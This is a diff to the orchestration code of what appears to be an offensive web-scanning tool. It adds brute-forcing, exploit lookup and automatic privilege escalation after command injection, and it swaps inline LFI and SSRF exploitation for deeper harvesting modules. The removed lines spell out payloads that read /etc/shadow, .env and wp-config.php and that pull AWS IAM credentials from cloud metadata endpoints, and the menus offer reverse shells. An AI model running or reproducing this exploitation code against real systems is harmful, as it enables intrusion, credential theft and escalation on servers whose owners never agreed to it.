@@ -58,6 +58,33 @@ def _run_tech_intel(state):
     return state["cve_intel"]
 
 
+def _run_sploitus_search(state):
+    from utils.sploitus_search import get_sploitus
+    tech_stack = state.get("tech_results", {})
+    if tech_stack:
+        sploitus = get_sploitus()
+        enrichments = sploitus.enrich_findings([], tech_stack=tech_stack)
+        if enrichments:
+            sploitus.print_results(enrichments)
+    return []
+
+
+def _run_brute_force(state):
+    from modules.brute_force import BruteForcer
+    from urllib.parse import urlparse
+    
+    host = urlparse(state["url"]).netloc.split(":")[0]
+    
+    # Basic port detection logic (fallback if no osint)
+    # Shodan OSINT data from _run_osint might contain ports
+    open_ports = None
+    if "osint_data" in state and isinstance(state["osint_data"], dict):
+        open_ports = state["osint_data"].get("ports")
+        
+    bruter = BruteForcer()
+    results = bruter.auto_brute(host, open_ports=open_ports)
+    return bruter.results_to_findings(results)
+
 def _run_subdomain_takeover(state):
     from modules.subdomain_takeover import scan_subdomain_takeover
 
@@ -391,10 +418,11 @@ def _run_cmdi_postprocess(state):
         f"[?] CMDi Exploit Options:\n"
         f"  1) Interactive Pseudo-Shell\n"
         f"  2) Reverse Shell (catch TTY connection)\n"
-        f"  3) Skip"
+        f"  3) Auto Privilege Escalation Scan\n"
+        f"  4) Skip"
         f"{Colors.END}"
     )
-    choice = state["prompt_input"]("Choice [1/2/3]:", "3").strip()
+    choice = state["prompt_input"]("Choice [1/2/3/4]:", "4").strip()
 
     if choice == "1":
         shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
@@ -431,6 +459,27 @@ def _run_cmdi_postprocess(state):
             if listener.wait_for_connection(timeout=120):
                 listener.interact()
             listener.stop()
+
+    elif choice == "3":
+        from modules.privesc_scanner import PrivEscScanner
+
+        shell = InteractiveShell(state["scan_url"], cmdi_vulns[0])
+        if shell.check_connection():
+            scanner = PrivEscScanner(shell)
+            findings = scanner.scan_all()
+            if findings.get("suggestions"):
+                print(
+                    f"\n{Colors.BOLD}{Colors.CYAN}"
+                    f"[?] Auto-attempt top escalation path? (y/N)"
+                    f"{Colors.END}"
+                )
+                esc_choice = state["prompt_input"]("Choice:", "N").lower()
+                if esc_choice == "y":
+                    top = findings["suggestions"][0]
+                    log_info(f"Executing: {top['command']}")
+                    output = shell.execute(top["command"])
+                    if output:
+                        print(output)
 
     return []
 
@@ -472,10 +521,10 @@ def _run_autopwn_postprocess(state):
 
 
 def _run_lfi_postprocess(state):
-    """Auto-exploit confirmed LFI vulns: read sensitive files, save via LootManager."""
+    """Auto-exploit confirmed LFI vulns: deep file harvesting via DeepLFIExploit."""
+    from modules.lfi_exploit import DeepLFIExploit
     from utils.colors import Colors, log_info, log_success, log_warning
     from utils.loot_manager import LootManager
-    from utils.request import smart_request
 
     options = state.get("options", {})
     if not options.get("exploit"):
@@ -487,7 +536,7 @@ def _run_lfi_postprocess(state):
 
     print(
         f"\n{Colors.BOLD}{Colors.CYAN}"
-        f"[?] {len(lfi_vulns)} LFI vuln(s) found. Auto-read sensitive files? (y/N)"
+        f"[?] {len(lfi_vulns)} LFI vuln(s) found. Deep file harvesting? (y/N)"
         f"{Colors.END}"
     )
     choice = state["prompt_input"]("Choice:", "N").lower()
@@ -496,66 +545,26 @@ def _run_lfi_postprocess(state):
 
     scan_dir = state.get("scan_dir", "/tmp")
     loot = LootManager(scan_dir)
-
-    # Files to try reading via confirmed LFI
-    sensitive_files = [
-        "/etc/passwd",
-        "/etc/shadow",
-        "../../../../.env",
-        "../../../../wp-config.php",
-        "/proc/self/environ",
-        "/etc/hosts",
-        "../../../../config/database.yml",
-    ]
+    exploit = DeepLFIExploit(loot_manager=loot)
 
     for vuln in lfi_vulns:
-        url = vuln.get("url", "")
-        param = vuln.get("param", "")
-
-        if not url or not param:
-            continue
-
-        log_info(f"LFI exploit on {param}@{url[:60]}...")
-
-        for target_file in sensitive_files:
-            try:
-                # Build the exploit payload using the same traversal pattern
-                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-                parsed = urlparse(url)
-                params = parse_qs(parsed.query, keep_blank_values=True)
-                params[param] = [target_file]
-                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
-                test_url = urlunparse(parsed._replace(query=urlencode(flat)))
-
-                resp = smart_request("get", test_url, delay=0.5)
-                if resp and resp.status_code == 200:
-                    body = resp.text
-                    # Check if file content is actually present
-                    if target_file == "/etc/passwd" and "root:" in body:
-                        loot.save_file_download("/etc/passwd", body)
-                        log_success(f"  📄 /etc/passwd extracted!")
-                    elif ".env" in target_file and ("DB_PASSWORD" in body or "APP_KEY" in body):
-                        loot.save_file_download(".env", body)
-                        log_success(f"  📄 .env file extracted!")
-                    elif "wp-config" in target_file and "DB_NAME" in body:
-                        loot.save_file_download("wp-config.php", body)
-                        log_success(f"  📄 wp-config.php extracted!")
-                    elif "root:" in body or "DB_" in body or "define(" in body:
-                        basename = target_file.split("/")[-1] or "unknown"
-                        loot.save_file_download(basename, body)
-                        log_success(f"  📄 {target_file} extracted!")
-            except Exception as e:
-                log_warning(f"  LFI read failed for {target_file}: {e}")
+        extracted = exploit.auto_exploit(vuln)
+        if extracted:
+            vuln["deep_lfi_data"] = {
+                "files_extracted": len(extracted),
+                "file_list": list(extracted.keys()),
+            }
+            log_success(f"Deep LFI: {len(extracted)} files harvested!")
 
     loot.summary()
     return []
 
 
 def _run_ssrf_postprocess(state):
-    """Auto-exploit confirmed SSRF vulns: probe cloud metadata endpoints."""
+    """Auto-exploit confirmed SSRF vulns: internal port scan + cloud credential harvest."""
+    from modules.ssrf_exploit import DeepSSRFExploit
     from utils.colors import Colors, log_info, log_success, log_warning
     from utils.loot_manager import LootManager
-    from utils.request import smart_request
 
     options = state.get("options", {})
     if not options.get("exploit"):
@@ -567,7 +576,7 @@ def _run_ssrf_postprocess(state):
 
     print(
         f"\n{Colors.BOLD}{Colors.CYAN}"
-        f"[?] {len(ssrf_vulns)} SSRF vuln(s) found. Probe cloud metadata? (y/N)"
+        f"[?] {len(ssrf_vulns)} SSRF vuln(s) found. Deep SSRF exploitation? (y/N)"
         f"{Colors.END}"
     )
     choice = state["prompt_input"]("Choice:", "N").lower()
@@ -576,48 +585,19 @@ def _run_ssrf_postprocess(state):
 
     scan_dir = state.get("scan_dir", "/tmp")
     loot = LootManager(scan_dir)
-
-    # Cloud metadata endpoints to probe via SSRF
-    metadata_targets = [
-        ("AWS", "http://169.254.169.254/latest/meta-data/"),
-        ("AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
-        ("AWS Token", "http://169.254.169.254/latest/api/token"),
-        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
-        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
-        ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
-        ("Internal", "http://127.0.0.1:80/"),
-        ("Internal:8080", "http://127.0.0.1:8080/"),
-    ]
+    exploit = DeepSSRFExploit(loot_manager=loot)
 
     for vuln in ssrf_vulns:
-        url = vuln.get("url", "")
-        param = vuln.get("param", "")
-        if not url or not param:
-            continue
-
-        log_info(f"SSRF cloud metadata probe on {param}@{url[:60]}...")
-
-        for cloud_name, metadata_url in metadata_targets:
-            try:
-                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-                parsed = urlparse(url)
-                params = parse_qs(parsed.query, keep_blank_values=True)
-                params[param] = [metadata_url]
-                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
-                test_url = urlunparse(parsed._replace(query=urlencode(flat)))
-
-                resp = smart_request("get", test_url, delay=0.5)
-                if resp and resp.status_code == 200 and len(resp.text) > 20:
-                    # Check for cloud-specific content
-                    body = resp.text
-                    if any(kw in body.lower() for kw in [
-                        "ami-id", "instance-id", "iam", "security-credentials",
-                        "computeMetadata", "metadata", "droplet_id",
-                    ]):
-                        loot.save_file_download(f"ssrf_{cloud_name.lower()}_metadata.txt", body)
-                        log_success(f"  ☁️ {cloud_name} metadata extracted!")
-            except Exception as e:
-                log_warning(f"  SSRF probe failed for {cloud_name}: {e}")
+        results = exploit.full_exploit(vuln)
+        if results:
+            vuln["deep_ssrf_data"] = {
+                "open_ports": len(results.get("open_ports", {})),
+                "cloud_entries": len(results.get("cloud_data", {})),
+            }
+            log_success(
+                f"Deep SSRF: {len(results.get('open_ports', {}))} open ports, "
+                f"{len(results.get('cloud_data', {}))} cloud entries"
+            )
 
     loot.summary()
     return []
@@ -793,6 +773,27 @@ def _run_scan_summary(state):
             recon_data=state.get("recon_data"),
             stats=stats,
         )
+    return []
+
+
+def _run_scan_history(state):
+    from utils.scan_history import ScanHistory
+    from utils.colors import console
+    
+    url = state.get("url")
+    vulns = state.get("all_vulns", [])
+    
+    if url:
+        history = ScanHistory()
+        # Compute drift against the last scan
+        drift = history.compute_drift(url, vulns)
+        # Output the drift report nicely
+        console.print("\n[bold cyan]═══ Scan Drift Report ═══[/bold cyan]")
+        console.print(drift.to_markdown())
+        console.print("[bold cyan]═════════════════════════[/bold cyan]\n")
+        # Save current scan to history for future comparisons
+        history.save_scan(url, vulns)
+
     return []
 
 
